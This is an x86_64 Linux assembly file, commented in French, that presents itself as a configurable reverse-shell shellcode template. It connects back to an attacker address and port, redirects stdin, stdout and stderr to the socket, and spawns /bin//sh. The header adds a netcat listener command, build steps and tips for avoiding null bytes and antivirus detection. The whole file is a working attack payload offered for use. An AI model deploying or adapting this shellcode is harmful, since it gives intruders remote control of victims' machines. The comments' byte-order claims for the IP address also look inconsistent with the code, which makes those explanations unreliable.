; =============================================================================
; reverse_shell.s — Shellcode template x86_64 Linux
; =============================================================================
; Description : Ouvre une connexion TCP retour vers l'attaquant,
;               puis spawn /bin//sh avec stdin/stdout/stderr redirigés
;               sur le socket → shell interactif à distance.
;
; Configuration :
;   LHOST = 192.168.1.100  → 0xc0a80164  (pas de null bytes)
;   LPORT = 4444           → 0x115c en big-endian réseau
;
;   ⚠️  Pour changer l'IP/port, modifier les deux lignes marquées [CONFIGURE]
;   ⚠️  Éviter les IPs avec des octets à 0x00 (ex: 10.0.0.1 → null bytes !)
;       → utiliser une IP type 192.168.x.x ou 172.x.x.x
;       → ou XOR-encoder l'adresse si on ne peut pas éviter les null bytes
;
; Pipeline d'exploitation :
;   [attaquant]  nc -lvnp 4444
;   [cible]      shellcode s'exécute → connexion vers 192.168.1.100:4444
;   [attaquant]  reçoit un shell
;
; Syscalls utilisés :
;   socket  (41)   → crée le socket TCP
;   connect (42)   → connexion vers l'attaquant
;   dup2    (33)   × 3 → redirige stdin/stdout/stderr sur le socket
;   execve  (59)   → spawn /bin//sh
;
; Taille      : ~87 bytes
; Null bytes  : aucun (avec l'IP d'exemple)
;
; Compilation :
;   nasm -f elf64 reverse_shell.s -o reverse_shell.o
;   ld reverse_shell.o -o reverse_shell
;   objcopy --dump-section .text=reverse_shell.bin reverse_shell
;
; Ou via build.sh fourni dans ce dossier.
; =============================================================================

section .text
global _start

_start:

; ─────────────────────────────────────────────────────────────────────────────
; 1. socket(AF_INET=2, SOCK_STREAM=1, 0) → rax = sockfd
; ─────────────────────────────────────────────────────────────────────────────
    push 41
    pop rax                     ; rax = 41 (syscall socket)
    push 2
    pop rdi                     ; rdi = AF_INET = 2
    push 1
    pop rsi                     ; rsi = SOCK_STREAM = 1
    xor rdx, rdx                ; rdx = 0 (protocol auto)
    syscall
    mov r9, rax                 ; r9 = sockfd (sauvegarde)

; ─────────────────────────────────────────────────────────────────────────────
; 2. connect(sockfd, &sockaddr_in, 16)
;
;    struct sockaddr_in {
;        uint16_t sin_family;   // 2  → AF_INET = 0x0002
;        uint16_t sin_port;     // 2  → 4444   = 0x115c (big-endian réseau)
;        uint32_t sin_addr;     // 4  → LHOST  = 0xc0a80164 (192.168.1.100)
;        uint8_t  sin_zero[8];  // 8  → 0x00...
;    };                         // total = 16 bytes
;
;    On construit la structure sur la stack en 2 push de 8 bytes.
;    Push 1 : sin_zero (8 bytes de zéros)
;    Push 2 : sin_addr(4) | sin_port(2) | sin_family(2)
;             = 0xc0a80164_115c_0002 lu en little-endian mémoire
;             = bytes: 02 00 5c 11 64 01 a8 c0
;             → entier 64-bit LE : 0xc0a801645c110002
; ─────────────────────────────────────────────────────────────────────────────
    push 42
    pop rax                     ; rax = 42 (syscall connect)

    mov rdi, r9                 ; rdi = sockfd

    ; Build sockaddr_in (16 bytes) sur la stack — sans null bytes
    ;
    ; Le problème : sin_family = 0x0002 → en mémoire LE → bytes "02 00"
    ;               le "00" casserait un strcpy ou une détection AV.
    ;
    ; Solution : on push 16 bytes de zéros via deux push rbx(=0),
    ;            puis on patch chaque champ individuellement avec
    ;            mov byte/word/dword — les opcodes de ces instructions
    ;            ne contiennent pas de null bytes pour ces valeurs.
    ;
    xor rbx, rbx
    push rbx                    ; 8 bytes de zéros (sin_zero)
    push rbx                    ; 8 bytes placeholder (family/port/addr)

    ; sin_family = AF_INET = 2  → mov byte [rsp], 2  → opcode C6 04 24 02 ✓
    mov byte [rsp], 2

    ; [CONFIGURE] ↓ modifier ici pour changer l'IP et le port
    ; sin_port = 4444 en big-endian réseau = 0x115c
    ; → stocker 0x5c11 en LE pour avoir "11 5c" en mémoire → port 4444 ✓
    mov word [rsp+2], 0x5c11    ; opcode 66 C7 44 24 02 11 5C ✓

    ; sin_addr = 192.168.1.100 = 0xc0a80164
    ; → stocker en LE : bytes "64 01 a8 c0" = 192.168.1.100 ✓
    mov dword [rsp+4], 0xc0a80164   ; opcode C7 44 24 04 64 01 A8 C0 ✓
    ; [CONFIGURE] ↑

    mov rsi, rsp                ; rsi = &sockaddr_in
    push 16
    pop rdx                     ; rdx = addrlen = 16
    syscall

; ─────────────────────────────────────────────────────────────────────────────
; 3. dup2(sockfd, 0/1/2) → redirige stdin, stdout, stderr sur le socket
; ─────────────────────────────────────────────────────────────────────────────

    ; dup2(sockfd, stdin=0)
    push 33
    pop rax                     ; syscall dup2
    mov rdi, r9                 ; sockfd
    xor rsi, rsi                ; newfd = 0 (stdin)
    syscall

    ; dup2(sockfd, stdout=1)
    push 33
    pop rax
    mov rdi, r9
    push 1
    pop rsi                     ; newfd = 1 (stdout)
    syscall

    ; dup2(sockfd, stderr=2)
    push 33
    pop rax
    mov rdi, r9
    push 2
    pop rsi                     ; newfd = 2 (stderr)
    syscall

; ─────────────────────────────────────────────────────────────────────────────
; 4. execve("/bin//sh", NULL, NULL) → spawn le shell
; ─────────────────────────────────────────────────────────────────────────────
    xor rdx, rdx                ; envp = NULL
    xor rsi, rsi                ; argv = NULL
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" en little-endian
    push rbx
    mov rdi, rsp                ; rdi = "/bin//sh"
    push 59
    pop rax                     ; syscall execve
    syscall
